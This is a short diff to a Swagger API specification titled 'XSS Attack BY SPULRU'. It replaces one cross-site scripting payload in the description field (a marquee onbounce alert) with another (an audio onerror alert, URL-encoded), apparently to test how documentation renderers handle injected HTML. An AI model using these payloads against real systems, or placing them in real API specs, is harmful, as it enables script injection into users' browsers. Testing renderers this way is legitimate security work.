@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
   description: |
-    </p><marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee><p>
+    </p><audio src/onerror%3dalert(1)><p>
     
   version: production
 basePath: /JSSResource/
